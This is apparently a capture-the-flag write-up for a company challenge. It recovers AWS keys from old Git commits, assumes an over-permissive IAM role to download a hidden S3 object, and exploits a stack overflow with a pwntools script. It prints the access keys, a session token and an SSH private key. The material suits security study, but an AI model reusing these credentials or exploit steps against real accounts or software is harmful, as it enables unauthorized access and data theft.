# Tekion-Challenge

This repo has my writeup for the challenge posted on LinkedIn.

## Challenge Details

---

"People lie! Git doesn't. That's the ONLY SSOT. May the master of the key know this!" =>

Stuff given:

HINT:
Julius wants to help. So he left something here:

cookn://bdocpw.xjh/ozfdji-nkzzy/cmhn-xjhk-ntnozhn-yphk/omzz/hvdi

FLAG =>
YWdlLWVuY3J5cHRpb24ub3JnL3YxCi0+IHNzaC1lZDI1NTE5IHBVT05LQSBGclNwUEwzNnBzVjZoUGVGdk9SVjFOOVRTd1JqRjdpTi9TaU81ckVudzFZCnl1WmlmV2diY2M2Smt5dFBmRFA4aW5JQ0loQTI0S1R3endlNmdmaTFSWEUKLS0tIE5yK0d3MFg5T0Vac0sxaGFNbUphcm9rbm1PUlRwVEZJNjRTZ0N3MTFFaTAKyJ9jMF/k1r9D3871i1PluzFDSo1kJZENZTI5+9HHPQLDlcTn9+xJmWIsrARtN7IrBzUp2lae9zH1T2xdI0Q1d5EAPBXP1MlNZGSb/X+5mNgPPLQucvWe3APKeGCtVB8BN5UVZREKbO/4iUP+wdgclw==

Flag format => string{string}

---

## WRITE-UP

### STEP-1 : First look at the FLAG

Looking at the FLAG format, it appears to be base64 encoded, and decoding it gives:

```bash
$ echo "YWdlLWVuY3J5cHRpb24ub3JnL3YxCi0+IHNzaC1lZDI1NTE5IHBVT05LQSBGclNwUEwzNnBzVjZoUGVGdk9SVjFOOVRTd1JqRjdpTi9TaU81ckVudzFZCnl1WmlmV2diY2M2Smt5dFBmRFA4aW5JQ0loQTI0S1R3endlNmdmaTFSWEUKLS0tIE5yK0d3MFg5T0Vac0sxaGFNbUphcm9rbm1PUlRwVEZJNjRTZ0N3MTFFaTAKyJ9jMF/k1r9D3871i1PluzFDSo1kJZENZTI5+9HHPQLDlcTn9+xJmWIsrARtN7IrBzUp2lae9zH1T2xdI0Q1d5EAPBXP1MlNZGSb/X+5mNgPPLQucvWe3APKeGCtVB8BN5UVZREKbO/4iUP+wdgclw==" | base64 -d
age-encryption.org/v1
-> ssh-ed25519 pUONKA FrSpPL36psV6hPeFvORV1N9TSwRjF7iN/SiO5rEnw1Y
yuZifWgbcc6JkytPfDP8inICIhA24KTwzwe6gfi1RXE
--- Nr+Gw0X9OEZsK1haMmJaroknmORTpTFI64SgCw11Ei0
e29���=Õ����I�b,�m7�+5)�V��1�Ol]#D5w�<���Mdd�����<�.r����x`�T7�e

```

It looks like it was encrypted using age-encryption/v1 using SSH ED25519 public key. As age-encryption is an asymmetric encryption, I cant get any other info without the private key that was used to encrypt the flag.

---

### STEP-2 : First look at the hint

The hint was:

```
cookn://bdocpw.xjh/ozfdji-nkzzy/cmhn-xjhk-ntnozhn-yphk/omzz/hvdi
```

looking at the format of this hint, this looks to be an encrypted link.

Running it through the dcode cipher identifier, it gives the following possible ciphers:
![](./images/dcode-identify.png)

Now running it through the ROT Cipher Decoder, we get:
![](./images/dcode-rot13.png)

This deciphers the link to: **https://github.com/tekion-speed/hrms-comp-systems-dump/tree/main**

---

### STEP-3 : To the Github Repo

The deciphered link points to a github repo **tekion-speed/hrms-comp-systems-dump**.

The files in the repo can be found [here](./files/github_repo/hrms-comp-systems-dump/).

Though most of the files dont show any usable info, the [test_policy](./files/github_repo/hrms-comp-systems-dump/test_policy) file, gives us few policies for an aws s3 bucket named **tekion-hr-system-backup**.
Going through these policies, 2 policies are particularly useful:

```
{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::tekion-hr-system-backup/combined_salaries_backup.bin"
},
{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:ListBucket",
    "Resource": "arn:aws:s3:::tekion-hr-system-backup",
    "Condition": {
        "StringEquals": {
            "s3:delimiter": "/"
        }
    }
},
```

These policies allow an anonymous user to access/download the combined_salaries_backup.bin file and list the contents of the bucket with the "/" delimiter (essentially allowing viewing top-level folders).

---

### STEP-4 : Anonymous S3 Access

So listing the contents of the s3 bucket using aws cli and --no-sign-request flag to run the request as anonymous, we get:

```bash
$ aws s3 ls s3://tekion-hr-system-backup --no-sign-request
                           PRE global-salaries/
2025-03-27 16:23:02     614454 combined_salaries_backup.bin
```

This shows the bucket has a folder named global-salaries and a file named combined_salaries_backup.bin. As we saw in the policies we cannot access the global-salaries folder as an anonymous user, but I was able to download the [combined_salaries_backup.bin](./files/s3-bucket/combined_salaries_backup.bin) file.

The combined_salaries_backup.bin appears to be a log-collection of binary data and get requests to data of various countries. The get requests are of the format:

```
GET https://s3.amazonaws.com/[Country-Name]/salary-details_[Country-Code]
```

As these requests also access a s3 bucket, I tried to acceess it but it says no such bucket exists. Other entries in the file are similar and practically no use.

---

### STEP-5 : Back to the Github Repo

As the combined_salaries_backup.bin didnt give me any clue to proceed, I went back to the github repo to find any clues I might've missed. Going through the repo, I remembered the challenge text, which mentioned something about git, so I looked at the older commits to the repo.

The previous commits showed 5 file that have been removed in the current repository. These files were:

- [access_store](./files/github_repo/old_commits/access%20store)
- [iam policies](./files/github_repo/old_commits/iam_policies)
- [bucket_policy](./files/github_repo/old_commits/bucket_policy)
- [lambda_policy](./files/github_repo/old_commits/lambda%20policies)
- [lambda trust relation](./files/github_repo/old_commits/lambda%20trust%20relation)

In these files, the access_store file contains AWS credentials such as **access_key_id** and **access_key_secret** which can allow us to access the files which are not publicly accessible on the s3 bucket.Apart from that, the bucket policy seem to be an older version of the test_policy file we currently have, and the lambda_trust_relation file states that both the Lambda service and any AWS account can assume the Lambda service role.

---

### STEP-6 : Authenticated S3 Access

Now since we have the AWS credentials, we can access the global_salaries directory on the s3 bucket. First we have to configure aws:

```bash
$ aws configure
AWS Access Key ID [None]: AKIARWHD4LUYUJZYDVG3
AWS Secret Access Key [None]: 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
Default region name [us-west-1]: us-west-1
Default output format [json]: json
```

Now I tried accessing the 'tekion-hr-system-backup/global-salaries/hr_systems_salary_module.json' file but it gives 403 error. Looking back at the policies, I came across the following policy:

```
{
    "Effect": "Deny",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::tekion-hr-system-backup/global-salaries/hr_systems_salary_module.json",
    "Condition": {
        "StringNotEquals": {
            "aws:CalledVia": "lambda.amazonaws.com"
        }
    }
},
```

Which states the file can only be accessed if the request is made via lambda.amazonaws.com.

In the lambda trust relation file we saw that any AWS user can assume the LambdaAccessRole, and this can be done using **aws sts**.

First we need to get our account number.

```bash
$ aws sts get-caller-identity
{
    "UserId": "AIDARWHD4LUYQIUEOLQ64",
    "Account": "116442029361",
    "Arn": "arn:aws:iam::116442029361:user/salary-details-system-user"
}
```

Next we need to assume the "LambdaAccessRole" role.

```bash
$ aws sts assume-role --role-arn "arn:aws:iam::116442029361:role/LambdaAccessRole" --role-session-name "tekion"
{
    "Credentials": {
        "AccessKeyId": "ASIARWHD4LUY5O67OGGL",
        "SecretAccessKey": "1Nhre2HoDBRzxI/RfoAEBilZNFNVP5O2y4R/nCUX",
        "SessionToken": "IQoJb3JpZ2luX2VjED8aCXVzLXdlc3QtMSJHMEUCIBhd8/4+u4ur0lHpK+6ljE+XMaKWCJxZI8k/TZKA73PaAiEA7deyEMmZsAxWEK4HvjHF0kRP4GoRtsLLT+zrkgvI73QqnAIIuP//////////ARAFGgwxMTY0NDIwMjkzNjEiDAaatKg+q+FV9VnKQCrwAdgfHwcoUePOqa7tr/EKP1mjFO4OcY+MqFhqaEb1w6ZKMcEGk9Lvm2j8BwiolBZ0drmRT8yuNwxfQJgnK1yFvKcttG4gX4tNUvRfmposabAqsMZ7gfxsStE2x3m/SLIrZAqnVgy5tyNDULwSniRG9NDRMd8KjaZsPJ7kbQWQUyDWv8N8RM0swH02fjltUybvUWchkDyCER/3hqcaAJuImDFCMFq19CSmp+HmGid0P2fbNql+PDMIYX4SUmneMtfdJQLkNKqB0Ytk7jDeYvrV9LCqC0HWumcjTtGE+qCd228xl7Tyhhm8pxqFx1Y8aO0x8TCy9+K/BjqdAZ6f8qn5Sz0KExL5DSkbbzB0xRW+3XvTV4ZQqLebdUdE+SkgUHi7CXj5Qd0MlKttEM4pyoVIPl48eE0bOXEDMcCvKtLaQHxsOJFJBVPHDIN+Ae1oVPOim64A8RdKYxf6FmGLH9iBBjapYfTDSvo5KAxwiavf8w/Gn2PxSrbuj/0R9iqcQWnEt4qojxQW981zRyR47JJ5K6L+QvDkSeY=",
        "Expiration": "2025-04-11T07:50:26+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARWHD4LUY4WRVEUGBQ:tekion",
        "Arn": "arn:aws:sts::116442029361:assumed-role/LambdaAccessRole/tekion"
    }
}
```

Now the AccessKeyID, SecretAccessKey and SessionToken neet to be exported to environment varibales.

```bash
export AWS_ACCESS_KEY_ID="ASIARWHD4LUY5O67OGGL"
export AWS_SECRET_ACCESS_KEY="1Nhre2HoDBRzxI/RfoAEBilZNFNVP5O2y4R/nCUX"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjED8aCXVzLXdlc3QtMSJHMEUCIBhd8/4+u4ur0lHpK+6ljE+XMaKWCJxZI8k/TZKA73PaAiEA7deyEMmZsAxWEK4HvjHF0kRP4GoRtsLLT+zrkgvI73QqnAIIuP//////////ARAFGgwxMTY0NDIwMjkzNjEiDAaatKg+q+FV9VnKQCrwAdgfHwcoUePOqa7tr/EKP1mjFO4OcY+MqFhqaEb1w6ZKMcEGk9Lvm2j8BwiolBZ0drmRT8yuNwxfQJgnK1yFvKcttG4gX4tNUvRfmposabAqsMZ7gfxsStE2x3m/SLIrZAqnVgy5tyNDULwSniRG9NDRMd8KjaZsPJ7kbQWQUyDWv8N8RM0swH02fjltUybvUWchkDyCER/3hqcaAJuImDFCMFq19CSmp+HmGid0P2fbNql+PDMIYX4SUmneMtfdJQLkNKqB0Ytk7jDeYvrV9LCqC0HWumcjTtGE+qCd228xl7Tyhhm8pxqFx1Y8aO0x8TCy9+K/BjqdAZ6f8qn5Sz0KExL5DSkbbzB0xRW+3XvTV4ZQqLebdUdE+SkgUHi7CXj5Qd0MlKttEM4pyoVIPl48eE0bOXEDMcCvKtLaQHxsOJFJBVPHDIN+Ae1oVPOim64A8RdKYxf6FmGLH9iBBjapYfTDSvo5KAxwiavf8w/Gn2PxSrbuj/0R9iqcQWnEt4qojxQW981zRyR47JJ5K6L+QvDkSeY="
```

Now the user role can be verified.

```bash
$ aws sts get-caller-identity
{
    "UserId": "AROARWHD4LUY4WRVEUGBQ:tekion",
    "Account": "116442029361",
    "Arn": "arn:aws:sts::116442029361:assumed-role/LambdaAccessRole/tekion"
}
```

Now the file can be downloaded.

```bash
aws s3 cp s3://tekion-hr-system-backup/global-salaries/hr_systems_salary_module.json ./

```

---

### STEP-7 : Looking at the new file

Looking the the newly downloaded file, it did not appear to be a json. So I ran the file utility.

```bash
$ file hr_systems_salary_module.json
hr_systems_salary_module.json: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5f94b8e64076eb9f2024944458c5e20395e05cd3, for GNU/Linux 3.2.0, not stripped
```

This shows that the file is actually a executable binary.

---

### STEP-8 : Pwning the .json

First I ran a checksec on the binary to get any useful info:

![](./images/checksec.png)

This shows the binary has no canary, no PIE which can lead to buffer overflows.

Now opening the binary in ida64.
![](./images/main.png)

This shows the main function calls the vulnerable_function, which has the decomp:
![](./images/vuln_func.png)

The vulnerable function calls gets on a stack varibale, which means we can send anynumber of bytes as input. And since there was no canary we can overwrite the saved rbp and rip to gain control of program flow.

The function list also shows a hidden_function.
![](./images/hidden_func.png)

The hidden function prints out what appears to be a SSH private key, which might be able to decrypt the FLAG file. As hidden_function is not called anywhere, we can use the vulnerability in the vulnerable_function to divert program flow to the hidden function.

This can be the done with the following script:

```python
from pwn import *

context.binary = elf = ELF('./files/s3-bucket/hr_systems_salary_module.json')

pr = process()

payload = b'\x00'*0x40 #buffer bytes
payload += b'SAVEDRBP' #overwrite rbp
payload += p64(elf.sym['hidden_function']) #overwrite rip to call hidden_function
pr.sendline(payload)
pr.recvuntil(b'\n\n\n')

priv_key = pr.recvall().decode()

print(priv_key) #print the private key
with open('id_ed25519','w') as file: #save the private key to a file
    file.write(priv_key)
```

This outputs the private key:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCm0v2+zu5Btor6YJ20TdzaM7mldS6FgoxDGScF4bBtlgAAAKANaPlnDWj5
ZwAAAAtzc2gtZWQyNTUxOQAAACCm0v2+zu5Btor6YJ20TdzaM7mldS6FgoxDGScF4bBtlg
AAAEDR8fnfU6WumUI9Qh7qi1qpUgBFfzAMYbVzDdKgflzcpqbS/b7O7kG2ivpgnbRN3Noz
uaV1LoWCjEMZJwXhsG2WAAAAF3VidW50dUBpcC0xNzItMzEtNDMtMTE3AQIDBAUG
-----END OPENSSH PRIVATE KEY-----
```

---

### STEP-9 : Last leg: Decryption

Now using the age tool I can decrypt the flag.

```bash
$ age -d -i id_ed25519 flag
almost_there{821ae63dbe0c573eff8b69d451fb21bc-cb9f81491427f30112d8cd0ec97e97fc}
```

The flag format says the flag is string{string}, so there is still more to be figured out for the flag.

---

### STEP-10 : Last-Last Leg: Decryption Returns

Looking at the 2 '-' separated strings between the curly braces, we can see that both strings are hex encoded bytes, thus we have 2, 16 bytes long strings.

Next, I use https://crackstation.net/ to crack these strings:
![](./images/md5_crack.png)

This give me the input words for:

821ae63dbe0c573eff8b69d451fb21bc as 'curious'
cb9f81491427f30112d8cd0ec97e97fc as 'seeker'

This brings me to the final flag.

## Final FLAG:

```
almost_there{curious_seeker}
```
